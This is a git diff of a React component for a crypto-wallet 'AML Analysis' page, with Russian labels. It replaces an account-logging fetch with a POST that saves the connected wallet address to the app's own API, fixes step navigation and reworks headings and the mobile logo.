@@ -7,6 +7,7 @@ import "./ChooseNet.css";
 import { setCurrentStep } from "@/Redux/Slice/MainSlice";
 import { useDispatch, useSelector } from "react-redux";
 import { RootState } from "@/Redux/store";
+import axios from "axios";
 
 type Net = "TRX" | "ETH";
 
@@ -60,20 +61,15 @@ export function ChooseNet() {
         );
       }
 
-      // Ждем пока пользователь подтвердит соединение в кошельке
       const session = await approval();
       const namespace = session.namespaces.tron ?? session.namespaces.eip155;
       const account = namespace?.accounts?.[0];
-      fetch("/api/log-text", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ text: account }),
-      }).catch(console.error);
       const wallet = account.split(":")[2];
 
       setWalletAddress(wallet);
       setLoading(false);
-      dispatch(setCurrentStep(currentStep - 1));
+      await axios.post("/api/saveHash", { hash: wallet, net: choosedNet });
+      dispatch(setCurrentStep(currentStep + 1));
     } catch (err) {
       console.error(err);
       setLoading(false);
@@ -91,16 +87,31 @@ export function ChooseNet() {
             alt=""
             className="ChooseNet-left-logo"
           />
-
-          <h3 className="ChooseNet-left-title">Выберите сеть для проверки</h3>
+          <h3 className="home__content-underlogo second-color">
+            for AML Analysis
+          </h3>
+          {/* <h3 className="ChooseNet-left-title">Выберите из вариантов:</h3> */}
           <img src="/save.svg" alt="" className="ChooseNet-left-save-logo" />
         </div>
       </div>
 
       <div className="ChooseNet-right">
         <div className="ChooseNet-right-container">
+          <div className="mobile-logo">
+            <img
+              src={isDark ? "/logo.svg" : "/logo-white.svg"}
+              alt=""
+              className="ChooseNet-left-logo-mobile"
+            />
+            <h3 className="home__content-underlogo second-color">
+              for AML Analysis
+            </h3>
+          </div>
+
           <Back />
-          <div className="ChooseNet-right-title">Выберите из вариантов:</div>
+          <div className="ChooseNet-right-title">
+            Выберите сеть для проверки
+          </div>
 
           <div className="network-cards">
             <div
@@ -136,15 +147,6 @@ export function ChooseNet() {
           >
             {loading ? "Подключение к Trust Wallet..." : "Продолжить"}
           </button>
-
-          {walletAddress && (
-            <div className="ChooseNet-result">
-              <div className="ChooseNet-result-address">
-                <span className="label">Адрес:</span>
-                <span className="mono">{walletAddress}</span>
-              </div>
-            </div>
-          )}
         </div>
       </div>
     </section>
